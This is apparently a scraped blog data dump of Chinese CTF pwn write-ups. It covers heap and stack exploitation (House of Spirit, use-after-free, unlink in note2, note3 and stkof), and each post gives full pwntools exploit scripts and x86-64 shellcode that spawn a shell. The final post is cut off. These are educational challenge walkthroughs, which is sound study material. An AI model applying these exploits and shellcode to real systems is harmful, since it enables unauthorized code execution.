\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')泄露rbp 并选择合适的fakechunk地址123456789payload = shellcode.ljust(46, 'a')payload += 'bb'c.send(payload)c.recvuntil('bb')rbp_addr = c.recvuntil(', w')[:-3]rbp_addr = u64(rbp_addr.ljust(8,'\\x00'))log.success('rbp_addr = ' + hex(rbp_addr))fake_addr = rbp_addr - 0x90shellcode_addr = rbp_addr - 0x50注意这里shellcode的地址，可以根据前面的栈结构图来求得，0x50 = 0x30(name) + 0x8(rbp) + 0x8(rip) + 0x10(main栈帧)伪造下一个堆块的size12c.recvuntil('id ~~?')c.sendline('48')这个size没有太严格要求，只需要大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem在money中伪造堆块并覆盖dest1234c.recvuntil('money~')payload = p64(0) * 5 + p64(0x41) payload = payload.ljust(0x38, '\\x00') + p64(fake_addr) c.send(payload)这里前面用p64(0)有好处，就是能够使sub_400A29中的strcpy(dest, &amp;buf);不起作用。这么构造也能和前面我们所选取的fakechunk的地址fake_addr相呼应。具体可以gdb调试一下就能看出来了。这里选取p64(0x41)是因为这样能够使ID正好相当于我们伪造chunk的nextchunk的size，具体可以画画图或者调试一下就可以了。free然后重新申请，并劫持程序123456789101112131415161718192021#freec.recvuntil('choice : ')c.sendline('2')#mallocc.recvuntil('choice : ')c.sendline('1')c.recvuntil('long?')c.sendline('48') # 0x30 because fakechunk's size = 0x41c.recvuntil('\\n48\\n')# overwrite rippayload = 'a' * 0x18 + p64(shellcode_addr)payload = payload.ljust(48, '\\x00')c.send(payload)# getshell by exitc.recvuntil('choice : ')c.sendline('3') c.interactive()需要注意的几个点都加了注释了。由于我们的栈结构在这几步时大概是这样的:123456789101112131415161718192021222324252627+------------+----- 低地址这边还有checkin、checkout之类的栈帧+------------+-----| rbp |+------------+| rip |+------------+-----sub_4009C4栈帧(0x10)+------------+-----| rbp |+------------+| rip |+------------+-----sub_400A29栈帧(0x40)+------------+-----| rbp |+------------+| rip | &lt;- 我们劫持的是这个rip+------------+-----sub_400A8E栈帧(0x50)+------------+-----| rbp |+------------+| rip |+------------+----- main栈帧(0x10)+------------+&lt;----rbp_addr 高地址当我们执行exit以后，栈帧还原，按照地址从低往高的顺序执行rip，当执行到被我们劫持，也就是被我们改成shellcode地址的rip的时候，就能执行shellcode从而getshell了~0x04 完整exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *c = process(\"./pwn200\")shellcode = \"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"payload = shellcode.ljust(46, 'a')payload += 'bb'c.send(payload)c.recvuntil('bb')rbp_addr = c.recvuntil(', w')[:-3]rbp_addr = u64(rbp_addr.ljust(8,'\\x00'))log.success('rbp_addr = ' + hex(rbp_addr))fake_addr = rbp_addr - 0x90shellcode_addr = rbp_addr - 0x50c.recvuntil('id ~~?')c.sendline('48')c.recvuntil('money~')payload = p64(0) * 5 + p64(0x41) payload = payload.ljust(0x38, '\\x00') + p64(fake_addr) c.send(payload)#freec.recvuntil('choice : ')c.sendline('2')#mallocc.recvuntil('choice : ')c.sendline('1')c.recvuntil('long?')c.sendline('48') # 0x30 because fakechunk's size = 0x41c.recvuntil('\\n48\\n')# overwrite rippayload = 'a' * 0x18 + p64(shellcode_addr)payload = payload.ljust(48, '\\x00')c.send(payload)# getshell by exitc.recvuntil('choice : ')c.sendline('3') c.interactive()","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"[UAF] lab 10 hacknote","slug":"UAF-lab-10-hacknote","date":"2020-02-11T05:16:26.000Z","updated":"2020-02-12T11:36:55.487Z","comments":true,"path":"2020/02/11/UAF-lab-10-hacknote/","link":"","permalink":"http://liul14n.top/2020/02/11/UAF-lab-10-hacknote/","excerpt":"","text":"0x00 前言百闻不如一见本文是对CTF-WIKI上Use After Free的一道例题的讲解。题目链接: 题目链接参考链接:CTF-WIKI0x01 分析12345Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x8048000)32位程序，提供了4个选项。12341. Add note 2. Delete note 3. Print note 4. Exitadd_noteAdd_note： 程序会通过malloc(8u)申请一个chunk，这个chunk的结构如下：prev_sizesize = 0x11puts函数指针content指针并且程序会根据用户输入的size申请一个chunk来读入content。prev_size | sizecontent(由对应note的content指针所指向，其大小由用户输入的size决定)这个函数出现了一个结构体，可以通过IDA将其还原，虽然不还原也不太影响读程序，但是还是练习一下还原结构体吧。首先在IDA中打开Local types界面，快捷键是Shift+F1，然后按Insert插入我们识别的结构体。1234struct note&#123; void (*myputs)();//这里是函数指针 char * content;&#125;;然后打开Structures界面，快捷键是Shift+F9，然后按Insert-Add standard structure，然后找到刚才我们定义的结构体note，然后确定。然后来到add_note函数的位置，对着v0按Y，然后输入struct note * v0，确定即可还原对应结构体。delete_note这也是漏洞所在的函数，程序只进行了free，但没有置NULL，也就是UAF漏洞。注意一下程序进行free的顺序：先free掉content指针，然后free掉noteprint_note这个函数的功能实际上就是通过note的puts函数指针调用puts函数，如果我们把puts函数指针覆盖成程序中已经给了我们的magic函数指针，就能执行magic函数。1234int magic()&#123; return system(\"cat flag\");&#125;0x02 Let’s do it思路利用fastbins的特性FILO，添加2个content大小符合fastbins的note，然后delete(0)、delete(1)，再次申请content大小为8的note，覆盖note0的puts函数指针为magic函数指针，然后通过print_note(0)来执行magic函数。为什么要添加2个content大小符合fastbins的note？大部分文章都说这两个note的content的size要符合fastbins，但是我在实际测试中就算这俩note的content的size不在fastbins范围内，也照样能pwn掉，而且根据这道题目利用的原理，似乎size没必要在fastbins范围内。但怕我才疏学浅，有什么遗漏或者不知道的地方，这里还是按照各位大佬们所说的来做吧。根据我们的思路，我们的执行流程是123456#size要符合fastbins的大小要求，我们这里令size = 0x20add(0x20,'aaaa')add(0x20,'bbbb')delete(0)delete(1)执行完这些以后123456789pwndbg&gt; fastbinfastbins0x10: chunk(1) —▸ chunk(0) ◂— 0x00x18: 0x00x20: 0x00x28: chunk(1)_content —▸ chunk(0)_content ◂— 0x00x30: 0x00x38: 0x00x40: 0x0由于fastbins的特性FILO,当我们再次申请大小为8的chunk的时候，会首先申请到chunk1，申请以后chunk1还在内存中的原位置(就是free前这个chunk在哪，申请后就在哪)， 再次申请大小为8的chunk的时候，就会申请到chunk0,也在内存中的原位置。而如果我们add_note的时候，程序固定会先malloc(8)，这时候申请到的是chunk1，假如我们让这个新的note2的content的size也为8，那么就能申请到chunk0来作为新的这个chunk2的content，这样就能修改里面的内容了，也就能修改掉puts函数指针为任意值了，这里当然要修改成magic函数指针了！理解了这些以后，这道题目似乎就没啥难点了，调试也比较容易，就不再放图了。0x03 完整EXP运行环境Ubuntu161234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *c = process('./hacknote')magic = 0x08048986def add(size,cont): c.recvuntil('Your choice :') c.sendline('1') c.recvuntil('Note size :') c.sendline(str(size)) c.recvuntil('Content :') c.sendline(cont) c.recvuntil('Success !\\n')def delete(idx): c.recvuntil('Your choice :') c.sendline('2') c.recvuntil('Index :') c.sendline(str(idx)) c.recvuntil('Success\\n')def printnote(idx): c.recvuntil('Your choice :') c.sendline('3') c.recvuntil('Index :') c.sendline(str(idx))add(0x20,'aaaa')add(0x20,'bbbb')delete(0)delete(1)add(0x08,p32(magic))#gdb.attach(c)printnote(0)c.interactive()0x04 总结看到一个博主写的总结，感觉挺不错。总结off-by-one：输入或者赋值是否考虑临界情况。利用：设置chunk大小使最后一个字节覆盖后指向的内容从不可操作到一个有意义可以操作的地址处。Unlink：输入或者赋值的长度能够比真正的chunk更大。利用：构造伪chunk设置后一个chunk的prev_size和flag标志，使系统执行unlink操作。执行unlink操作实现复写got表。特点：因为验证保护，需要一个跳板才能实现任意写，这个跳板一般是bss段的数据。也就是说需要bss段本身在程序中是存有有用数据的。use after free：free之后没有设置为NULL利用：创建，创建，删除，创建。构造伪chunk。特点：free之后可以继续输出。","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"[Unlink]-ZCTF-2016-note3","slug":"Unlink-ZCTF-2016-note3","date":"2020-02-06T05:01:20.000Z","updated":"2020-02-11T06:24:34.549Z","comments":true,"path":"2020/02/06/Unlink-ZCTF-2016-note3/","link":"","permalink":"http://liul14n.top/2020/02/06/Unlink-ZCTF-2016-note3/","excerpt":"","text":"0x00 前言依然是Unlink，写本文来警示自己exp一定要写的规范，因为我写的不规范，导致后期调试的时候一直多出来一个\\n，找了半天才发现是因为格式不规范..题目下载链接:下载链接参考链接:看雪CTF-WIKI0x01 分析12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000)与上文的note2一样，程序提供了5个选项。New note，创建note，每个note的size和chunk都会存在bss段的对应位置。Show note ，这次程序虽然提供了提供show，但却是输出&quot;No show, No leak.&quot;。Edit note，相比note2，这次程序只提供了overwrite方法。Delete note，能执行正常的free，并置0。Exit，退出程序。漏洞点1同note2一样，都会由于unsigned int 这个类型造成可写入大量数据。漏洞点2由于程序edit、delete函数里面对note ID的检验并不严谨，导致即使note ID是负数也能通过检验。0x02 Do it！漏洞点1可以仅用Unlink来利用。但是漏洞2需要配合UAF。本文是针对Unlink来写的，所以利用了漏洞点1，构造方法和原理与note2一样，具体可以看前文，相比之下note3因为没有直接的leak，我们需要想办法进行leak。前期模板12345678910111213141516171819202122232425262728293031# -*- coding:utf-8 -*-from pwn import *c = process('./note3')elf = ELF('./note3')libc = ELF('./libc.so.6')#context.log_level = 'debug'def new(size,cont): c.recvuntil('option---&gt;&gt;\\n') c.sendline('1') c.recvuntil('(less than 1024)\\n') c.sendline(str(size)) c.recvuntil('Input the note content:\\n') c.sendline(str(cont))def edit(id, cont): c.recvuntil('option---&gt;&gt;\\n') c.sendline('3') c.recvuntil('Input the id of the note:\\n') c.sendline(str(id)) c.recvuntil('new content:\\n') c.sendline(cont) c.recvuntil(\"Edit success!\\n\",timeout = 0.5)#注意这里def delete(idx): c.recvuntil('option---&gt;&gt;\\n') c.sendline('4') c.recvuntil('Input the id of the note:\\n') c.sendline(str(idx))因为我在第一次写的时候，delete里c.recvuntil(&#39;Input the id of the note:\\n&#39;)后面都没有加上\\n，这样导致后面leak的时候总会把\\n也读入进去，从而leak出来的结果不正确。为了严谨，对每个recvuntil都加上了\\n。注意代码中注意这里，这个设置了一个timeout，因为也不知道为什么，后期有一处edit的时候总是接收不到Edit success!\\n。伪造chunk并unlink123456789101112131415161718target = 0x6020c0 + 0x8 #0x6020c0存的是当前chunk的指针，0x6020c8才是chunk指针数组的起始位置。fd = target - 0x18bk = target - 0x10payload1 = 'a'*8 + p64(0xa1) + p64(fd) + p64(bk) + 'a'*0x60 #和note2一样的构造方法。new(0x80,payload1)new(0,'aaaa')new(0x80,'aaaaaaaaaa')delete(1) #delete以后进入fastbin，再次申请的时候还是申请的这一块c.recvuntil(\"Delete success\\n\")payload2 = 'a'*0x10 + p64(0xa0) + p64(0x90) #和note2一样的构造方法new(0,payload2) #再次申请 并覆盖第三个note的prevsize和size的inuse位delete(2) #unlinkc.recvuntil(\"Delete success\\n\")leak12345678910111213141516171819202122puts_got = elf.got[\"puts\"]puts_plt = elf.plt[\"puts\"]free_got = elf.got[\"free\"]system = libc.symbols['system']puts = libc.symbols['puts']payload3 = 'a'*0x18 + p64(free_got) + p64(puts_got)edit(0,payload3) #这个位置总是recvuntil不成功，所以才在edit函数那块加了个timeout。这里执行以后chunk0的位置为free_got，chunk1的位置为puts_gotlog.success('free_got = ' + hex(free_got))log.success('puts_got = ' + hex(puts_got))log.success('puts_plt = ' + hex(puts_plt))payload4 = p64(puts_plt)[:-1] #注意这里的[:-1]由于p64总共8个字节，如果不加上[:-1]会由于sendline最后的\\n覆盖掉与它紧邻位置的数据。而为什么能使用[:-1]? 可以输出hex(p64(puts_plt))试一下，会发现它是0x0000xxxxxxxxxx的形式，前面会有至少2个00，再加上小端序的问题，我们就相当于丢掉了开头的2个00，这样并不会产生太大影响，最主要的是我们保护了与它紧邻的数据。edit(0,payload4)#执行以后我们的free_got就变成了puts_pltdelete(1)#表面上执行的是free()函数，实际上执行的是puts(puts_got)，这样就完成了leakputs_addr = u64(c.recvuntil(\"\\nDelete success\\n\",drop=True).ljust(8,\"\\00\"))log.success('puts_addr = ' + hex(puts_addr))getshell123456789101112new(0x20,'/bin/sh\\00')#由于delete函数完成后会置0，所以这时候我们new一个新chunk的话，它会是chunk1libcbase = puts_addr - putssystem_addr = libcbase + systempayload5 = p64(system_addr)[:-1]#依然注意[:-1] 原因和上面一样edit(0,payload5)#这样free就变成了system#gdb.attach(c)delete(1)#表面上执行free()函数，实际上是system('/bin/sh')c.interactive()0x03完整exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586from pwn import *c = process('./note3')elf = ELF('./note3')libc = ELF('./libc.so.6')#context.log_level = 'debug'def new(size,cont): c.recvuntil('option---&gt;&gt;\\n') c.sendline('1') c.recvuntil('(less than 1024)\\n') c.sendline(str(size)) c.recvuntil('Input the note content:\\n') c.sendline(str(cont))def edit(id, cont): c.recvuntil('option---&gt;&gt;\\n') c.sendline('3') c.recvuntil('Input the id of the note:\\n') c.sendline(str(id)) c.recvuntil('new content:\\n') c.sendline(cont) c.recvuntil(\"Edit success!\\n\",timeout = 0.5)def delete(idx): c.recvuntil('option---&gt;&gt;\\n') c.sendline('4') c.recvuntil('Input the id of the note:\\n') c.sendline(str(idx))target = 0x6020c0 + 0x8fd = target - 0x18bk = target - 0x10payload1 = 'a'*8 + p64(0xa1) + p64(fd) + p64(bk) + 'a'*0x60new(0x80,payload1)new(0,'aaaa')new(0x80,'aaaaaaaaaa')delete(1)c.recvuntil(\"Delete success\\n\")payload2 = 'a'*0x10 + p64(0xa0) + p64(0x90)new(0,payload2)delete(2)c.recvuntil(\"Delete success\\n\")puts_got = elf.got[\"puts\"]puts_plt = elf.plt[\"puts\"]free_got = elf.got[\"free\"]system = libc.symbols['system']puts = libc.symbols['puts']payload3 = 'a'*0x18 + p64(free_got) + p64(puts_got)edit(0,payload3)log.success('free_got = ' + hex(free_got))log.success('puts_got = ' + hex(puts_got))log.success('puts_plt = ' + hex(puts_plt))payload4 = p64(puts_plt)[:-1]edit(0,payload4)delete(1)puts_addr = u64(c.recvuntil(\"\\nDelete success\\n\",drop=True).ljust(8,\"\\00\"))log.success('puts_addr = ' + hex(puts_addr))new(0x20,'/bin/sh\\00')libcbase = puts_addr - putssystem_addr = libcbase + systempayload5 = p64(system_addr)[:-1]edit(0,payload5)delete(1)c.interactive()","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"[Unlink]2016-ZCTF-note2","slug":"Unlink-2016-ZCTF-note2","date":"2020-02-03T13:55:00.000Z","updated":"2020-02-04T17:31:29.002Z","comments":true,"path":"2020/02/03/Unlink-2016-ZCTF-note2/","link":"","permalink":"http://liul14n.top/2020/02/03/Unlink-2016-ZCTF-note2/","excerpt":"","text":"0x00 前言依然是CTF-WIKI上关于Unlink的一道例题。题目下载链接:下载链接参考链接:CTF-WIKI简书0x01 分析12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000)程序提供了5个选项。New note，创建note，每个note的size和chunk都会存在bss段的对应位置。Show note 能输出note的内容。Edit note提供了overwrite和append两种方式。Delete note能执行正常的free。Exit 退出程序漏洞点1漏洞点1: 在New note中，我们的size采用的是unsigned int类型，但是在我们的读入函数MyRead((__int64)ptr, size, 10);1234567891011121314151617181920unsigned __int64 __fastcall MyRead(__int64 a1, __int64 a2, char a3)&#123; char v4; // [rsp+Ch] [rbp-34h] char buf; // [rsp+2Fh] [rbp-11h] unsigned __int64 i; // [rsp+30h] [rbp-10h] ssize_t v7; // [rsp+38h] [rbp-8h] v4 = a3; for ( i = 0LL; a2 - 1 &gt; i; ++i ) &#123; v7 = read(0, &amp;buf, 1uLL); if ( v7 &lt;= 0 ) exit(-1); if ( buf == v4 ) break; *(_BYTE *)(i + a1) = buf; &#125; *(_BYTE *)(a1 + i) = 0; return i;&#125;也就是在for循环的终止条件中，i 是与 a2(也就是我们的size)-1进行比较。 假设我们的size设为0，由于size是unsigned int类型，那么size-1将是4294967295这么大，我们就可以输入非常多的内容从而造成堆溢出了。由于glibc的分配内存机制，当我们的size = 0时，实际会分配给我们0x20的内存块。漏洞点2漏洞点2: 在Edit note中，程序只free掉了v8，并没有置NULL。思路本文利用的是漏洞点1， 貌似也可以利用漏洞点2？还请大佬们指教。创建三个chunk，大小分别为0x80,0x0,0x80,在chunk0中伪造chunk，通过chunk1的漏洞，修改掉chunk2的prev_size和size里的prev_inuse标志位，free掉chunk2，触发unlink，想办法泄露出某个函数的地址，然后推算出libcbase，从而得到system地址，将atoi覆盖成system，执行system(&#39;/bin/sh)0x02 Let’s do it!前期模板12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *c = process('./note2')libc = ELF('./libc.so.6')elf = ELF('./note2')#context.log_level = 'debug'def new(size,cont): c.recvuntil('option---&gt;&gt;') c.sendline('1') c.recvuntil('(less than 128)') c.sendline(str(size)) c.recvuntil('Input the note content:') c.sendline(str(cont))def show(idx): c.recvuntil('option---&gt;&gt;') c.sendline('2') c.recvuntil('Input the id of the note:') c.sendline(str(idx))def edit(id, choice, cont): c.recvuntil('option---&gt;&gt;') c.sendline('3') c.recvuntil('note:') c.sendline(str(id)) c.recvuntil('2.append]') c.sendline(str(choice)) c.sendline(cont)def delete(idx): c.recvuntil('option---&gt;&gt;') c.sendline('4') c.recvuntil('Input the id of the note:') c.sendline(str(idx))c.recvuntil('name:')c.sendline('liulian')c.recvuntil('address:')c.sendline('aaaa')创建note，并伪造chunkCTF-WIKI中，伪造chunk里的内容有点绕，不太好理解。本文的伪造chunk和CTF-WIKI中的不一样，相对来说更好理解一些吧，但是对大佬来说估计都一样..1234567891011121314head = 0x602120fakefd = head - 0x18fakebk = head - 0x10content = 'a' * 8 #paddingcontent += p64(0xa1)#fakechunk's sizecontent += p64(fakefd)content += p64(fakebk)new(0x80,content)new(0,'aaaa')new(0x80,'bbbb')对于伪造chunk的size为什么是0xa1?当它的size正好等于0xa1的时候,这个伪造chunk正好包含住chunk1且紧挨着chunk2。当我们free掉chunk2，程序会根据chunk2的presize来获得指向前一块chunk的指针。因此下一步就要想办法修改chunk2的presize和inuse标志位。修改chunk2的presize和inuse标志位 并执行unlink1234567delete(1)content = 'a'*16 + p64(0xa0) + p64(0x90)new(0,content)delete(2)当我们delete(1)的时候，由于该chunk属于fastbin，所以下次在申请的时候仍然会申请到该chunk，然后通过漏洞覆盖掉chunk2的prevsize和inuse位随后当我们delete(2)123456789p是指向free掉的chunk2的指针检查p指向chunk的size字段的pre_inuse位，是否为0（也就是检查当前chunk的前一块chunk是否是free的，如果是则进入向前合并的流程)获取前一块chunk的size，并加到size中（以此来表示size大小上已经合并）根据当前chunk的presize来获得指向前一块chunk的指针将这个指针传入unlink的宏（也就是让free掉的chunk的前一块chunk进入到unlink流程）那么伪造chunk就会执行unlink，效果就是让前面的*(head) = head - 0x18打印出atoi的地址，并计算libcbase1234567891011121314151617atoi_got = elf.got['atoi']content = 'a'*0x18 + p64(atoi_got)edit(0,1,content)show(0)c.recvuntil('is ')atoi_addr = c.recvuntil('\\n', drop=True)atoi_addr = u64(atoi_addr.ljust(8, '\\x00'))log.success('atoi_addr = ' + hex(atoi_addr))libcbase = atoi_addr - libc.symbols['atoi']system = libcbase + libc.symbols['system']log.success('system = ' + hex(system))将atoi变成system，并getshell123456edit(0,1,p64(system))c.recvuntil('option---&gt;&gt;')c.sendline('/bin/sh')c.interactive()0x03 完整exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from pwn import *c = process('./note2')libc = ELF('./libc.so.6')elf = ELF('./note2')context.log_level = 'debug'def new(size,cont): c.recvuntil('option---&gt;&gt;') c.sendline('1') c.recvuntil('(less than 128)') c.sendline(str(size)) c.recvuntil('Input the note content:') c.sendline(str(cont))def show(idx): c.recvuntil('option---&gt;&gt;') c.sendline('2') c.recvuntil('Input the id of the note:') c.sendline(str(idx))def edit(id, choice, cont): c.recvuntil('option---&gt;&gt;') c.sendline('3') c.recvuntil('note:') c.sendline(str(id)) c.recvuntil('2.append]') c.sendline(str(choice)) c.sendline(cont)def delete(idx): c.recvuntil('option---&gt;&gt;') c.sendline('4') c.recvuntil('Input the id of the note:') c.sendline(str(idx))c.recvuntil('name:')c.sendline('liulian')c.recvuntil('address:')c.sendline('aaaa')head = 0x602120fakefd = head - 0x18fakebk = head - 0x10content = 'a' * 8 #paddingcontent += p64(0xa1)#fakechunk's sizecontent += p64(fakefd)content += p64(fakebk)new(0x80,content)new(0,'aaaa')new(0x80,'bbbb')delete(1)content = 'a'*16 + p64(0xa0) + p64(0x90)new(0,content)delete(2)atoi_got = elf.got['atoi']content = 'a'*0x18 + p64(atoi_got)edit(0,1,content)show(0)c.recvuntil('is ')atoi_addr = c.recvuntil('\\n', drop=True)atoi_addr = u64(atoi_addr.ljust(8, '\\x00'))log.success('atoi_addr = ' + hex(atoi_addr))libcbase = atoi_addr - libc.symbols['atoi']system = libcbase + libc.symbols['system']log.success('system = ' + hex(system))edit(0,1,p64(system))c.recvuntil('option---&gt;&gt;')c.sendline('/bin/sh')c.interactive()","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"[Unlink] 2014-HITCON-stkof ","slug":"Unlink-2014-HITCON-stkof","date":"2020-02-03T04:25:19.000Z","updated":"2020-02-03T19:33:56.838Z","comments":true,"path":"2020/02/03/Unlink-2014-HITCON-stkof/","link":"","permalink":"http://liul14n.top/2020/02/03/Unlink-2014-HITCON-stkof/","excerpt":"","text":"0x00 前言本例为CTF-WIKI上面用来练习Unlink的例题。题目下载链接:下载链接参考链接:CTF-WIKI简书0x01 分析12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000)alloc：输入 size，分配 size 大小的内存，并在 bss 段记录对应 chunk 的指针，假设其为 headread：根据指定索引，向分配的内存处读入数据，数据长度可控，这里存在堆溢出的情况free：根据指定索引，释放已经分配的内存块????：这个功能没啥用在2. read函数里面存在漏洞, 由于程序采用如下读取输入的方式,并不会对读取长度进行限制,故会造成堆溢出。12345for ( i = fread(ptr, 1uLL, n, stdin); i &gt; 0; i = fread(ptr, 1uLL, n, stdin) )&#123; ptr += i; n -= i;&#125;这里存在一个有趣的现象:值得注意的是，由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。这里经过测试，会申请两个缓冲区，分别大小为 1024 和 1024。所以我们可以在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。还有一点值得注意: 注意看1. alloc函数。这里采用的::s[++dword_602100] = v2;，也就是说，第一个chunk指针是存在s[1]的位置的。0x02 思路通过unlink漏洞,修改free@got为puts@plt,想办法输出puts函数的真实地址，计算libcbase，从而得到system地址.修改atoi@got为system, 输入/bin/sh的地址, 执行system(&#39;/bin/sh&#39;)获得shell。0x03 Let’s do it！前期模板1234567891011121314151617181920212223from pwn import *c = process('./stkof')elf = ELF('./stkof')libc = ELF('./libc.so.6')head = 0x602140def alloc(size): c.sendline('1') c.sendline(str(size)) c.recvuntil('OK\\n')def edit(idx,cont): c.sendline('2') c.sendline(str(idx)) c.sendline(str(len(cont))) c.send(cont) c.recvuntil('OK\\n')def free(idx): c.sendline('3') c.sendline(str(idx))这里注意一下edit函数,由于程序读入字符串的方式比较特殊，这里选取c.send(cont)。具体来讲就是,这个程序虽然不会对输入的字符串长度进行限制，但是这种读入方法不同于gets，gets读到换行符就会结束，但是这个程序读到换行符会把换行符也当做一种输入，然后继续等待接下来的输入，这显然不符合我们的需求。而sendline在末尾会有换行符，所以我们采用末尾不带有换行符而是相当于带有\\x00的send。申请内存前面的分析里已经讲到，需要申请先申请一个chunk把缓冲区分配掉。其次还要注意他们的下标，下标是从1开始的。123alloc(0x100) #1alloc(0x30) #2alloc(0x80) #3分配好以后，来看一下我们的head，也就是IDA里面显示的s，这也证明了下标是从1开始。123pwndbg&gt; x/10gx 0x6021400x602140: 0x0000000000000000 0x00000000019210200x602150: 0x0000000001921540 0x0000000001921580伪造chunk由于unlink能够实现*target = target-0x18(下面会在例子中讲)我们选取target = head + 16，也就是 head[2]的地址。因为接下来我们是需要通过free掉chunk2的nextchunk，也就是free(head[3])来触发unlink，而unlink的验证则要求fd-&gt;bk == P &amp;&amp; bk-&gt;fd == P。上面如果看着有点晕， 那么简单地说就是需要target = 我们伪造的chunk所在的chunk的地址。1234567891011121314target = head + 16fd = target - 0x18bk = target - 0x10payload = 'a'*8 #paddingpayload += p64(0x31) #sizepayload += p64(fd) #fd = target - 0x18payload += p64(bk) #bk = target - 0x10payload += 'a'*16 #paddingpayload += p64(0x30)#overwrite chunk3's prev_size payload += p64(0x90)#overwrite chunk3's sizeedit(2, payload)执行以后我们就能在chunk2里面伪造(套娃)一个chunk，然后覆盖掉chunk3的prev_size和size里的prev_inuse标志位。unlink先看一下unlink前我们head附近的内存123pwndbg&gt; x/10gx 0x6021400x602140: 0x0000000000000000 0x00000000019210200x602150: 0x0000000001921540 0x0000000001921580当程序unlink时，12345678910111213# unlink --&gt; # *(fd+0x18)=bk# *(bk+0x10)=fd# 则# *(head + 16) = head + 16 - 0x18# 而 (head + 16) == target # 即 *target = target-0x18，这里也证明了前面所说的unlink的作用。再来查看一下head附近的内存。123pwndbg&gt; x/10gx 0x6021400x602140: 0x0000000000000000 0x00000000019210200x602150: 0x0000000000602138 0x0000000000000000chunk3被free掉并置NULL了，chunk2的指针变成head - 0x8了。偷梁换柱得shell123456payload = 'a'*8 #paddingpayload += p64(elf.got['free']) #0下标payload += p64(elf.got['puts']) #1下标payload += p64(elf.got['atoi']) #2下标edit(2,payload)执行以后，head附近的内存应该是这样。1234pwndbg&gt; x/10gx 0x602140 - 0x100x602130: 0x0000000000000000 0x61616161616161610x602140: elf.got[&apos;free&apos;] elf.got[&apos;puts&apos;]0x602150: elf.got[&apos;atoi&apos;] 0x0000000000000000接下来我们把free_got改成puts_plt，那么我们执行free(1)的话就相当于执行puts(puts_got)。123#[free@got] = puts@pltpayload = p64(elf.plt['puts'])edit(0,payload)那么可以通过free(1)获取puts的真实地址puts_addr，进而获得libcbase和system了。1234567free(1)puts_addr = c.recvuntil('\\nOK\\n',drop = True).ljust(8,'\\x00')print puts_addrputs_addr = u64(puts_addr)libcbase = puts_addr - libc.symbols['puts']system_addr = libcbase + libc.symbols['system']然后我们有了system，就可以把atoi_got换成system了，从而获得shell。123456#[atoi@got] = systempayload = p64(system_addr)edit(2,payload)c.sendline('/bin/sh')c.interactive()0x04 完整exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899# -*- coding: utf-8 -*-from pwn import *c = process('./stkof')elf = ELF('./stkof')libc = ELF('./libc.so.6')head = 0x602140def alloc(size): c.sendline('1') c.sendline(str(size)) c.recvuntil('OK\\n')def edit(idx,cont): c.sendline('2') c.sendline(str(idx)) c.sendline(str(len(cont))) c.send(cont) c.recvuntil('OK\\n')def free(idx): c.sendline('3') c.sendline(str(idx))alloc(0x100)#1alloc(0x30) #2alloc(0x80) #3#gdb.attach(c)#fake chunktarget = head + 16fd = target - 0x18bk = target - 0x10payload = 'a'*8 #paddingpayload += p64(0x31) #sizepayload += p64(fd) #fd = target - 0x18payload += p64(bk) #bk = target - 0x10payload += 'a'*16 #paddingpayload += p64(0x30)#overwrite chunk3's prev_size payload += p64(0x90)#overwrite chunk3's sizeedit(2, payload)# unlink free(3) c.recvuntil('OK\\n')#gdb.attach(c)# unlink --&gt; # *(fd+0x18)=bk# *(bk+0x10)=fd# 则# *(head + 16) = head + 16 - 0x18# 而 (head + 16) == target # 即 *target = target-0x18payload = 'a'*8 #paddingpayload += p64(elf.got['free']) #0下标payload += p64(elf.got['puts']) #1下标payload += p64(elf.got['atoi']) #2下标edit(2,payload)#[free@got] = puts@pltpayload = p64(elf.plt['puts'])edit(0,payload)free(1)puts_addr = c.recvuntil('\\nOK\\n',drop = True).ljust(8,'\\x00')puts_addr = u64(puts_addr)libcbase = puts_addr - libc.symbols['puts']system_addr = libcbase + libc.symbols['system']log.success('puts_addr = ' + hex(puts_addr))log.success('libcbase = ' + hex(libcbase))log.success('system = ' + hex(system_addr))#[atoi@got] = systempayload = p64(system_addr)edit(2,payload)c.sendline('/bin/sh')c.interactive()","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"ciscn_2019_c_1","slug":"ciscn-2019-c-1","date":"2020-01-29T06:30:49.000Z","updated":"2020-01-29T07:09:37.713Z","comments":true,"path":"2020/01/29/ciscn-2019-c-1/","link":"","permalink":"http://liul14n.top/2020/01/29/ciscn-2019-c-1/","excerpt":"","text":"0x00 前言借助这道题目记录一下LibcSearcher的使用，当然这道题目用DynELF也可以。0x01 分析12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX 